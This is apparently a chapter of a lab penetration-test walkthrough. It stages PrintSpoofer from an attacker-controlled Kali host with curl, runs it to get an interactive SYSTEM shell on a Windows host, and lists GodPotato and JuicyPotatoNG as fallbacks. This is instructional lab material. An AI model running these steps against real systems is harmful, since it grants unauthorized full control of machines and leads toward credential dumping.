# 03 — `SeImpersonate` → SYSTEM with PrintSpoofer

A potato attack needs three things: `SeImpersonatePrivilege` (confirmed in chapter 02), a privileged
account that can be made to authenticate to something we control, and a way to catch that
authentication. PrintSpoofer gets the second from the Print Spooler and the third from a named pipe.

## 3.1 Stage the binary

The kit lives on Kali and is served once for the whole set:

```bash
cd ~/kit && python3 -m http.server 8000
```

On MS01 the download has to use capital `-O`; `curl.exe -o` without a filename writes nothing
useful on Windows:

```powershell
curl.exe -O http://192.168.45.158:8000/PrintSpoofer64.exe
```

Check what arrived before running it — the size is a cheap integrity check:

```powershell
Get-Item .\PrintSpoofer64.exe | Select-Object Name,Length
```

| Binary | Size (bytes) | Used |
|---|---|---|
| `PrintSpoofer64.exe` | `27,136` | **yes** |
| `GodPotato-NET4.exe` | `57,344` | fallback |
| `JuicyPotatoNG.exe` | `153,600` | fallback |
| `procdump64.exe` | `743,752` | chapter 04 |

## 3.2 Run it

```powershell
.\PrintSpoofer64.exe -c "whoami"
```

The tool prints its progress (privilege found, named pipe listening, `CreateProcessAsUser()` OK) and
then the output of the command — which is the point:

```
nt authority\system
```

That is the box. An interactive SYSTEM shell is the same call with `-i`:

```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```

```
PS C:\Users\eric.wallows\Desktop> whoami
nt authority\system
```

From here everything is local: LSASS is readable, the service control manager is writable, and the
second network card is reachable. Those are chapters 04 and 05.

## 3.3 Why this potato

`PrintSpoofer` targets the Print Spooler: it creates a named pipe, asks the spooler to connect to it,
and impersonates the resulting `SYSTEM` token. It works on the 19041 build in this set because the
spooler is running and the token carries `SeImpersonatePrivilege`.

Fallbacks, in the order I would try them:

| Binary | When |
|---|---|
| `GodPotato-NET4.exe` | spooler disabled; uses DCOM/RPC and works on Server 2019+ |
| `JuicyPotatoNG.exe` | older builds where the DCOM OXID resolution trick still applies |

All three fail the same way if the token is *filtered* rather than privileged — if `whoami /priv`
does not show `SeImpersonatePrivilege`, stop and look for a different escalation instead of trying
another potato.

## 3.4 Gotchas

- `%TEMP%` is a `cmd.exe` variable. In PowerShell it is `$env:TEMP`, and `cd %TEMP%` silently creates
  a directory literally called `%TEMP%`.
- PowerShell parses per line — never split an `if`/`else` across two pasted lines in a WinRM shell.
- Upload direction matters: `curl.exe -T file http://…` uploads, `-O` downloads.
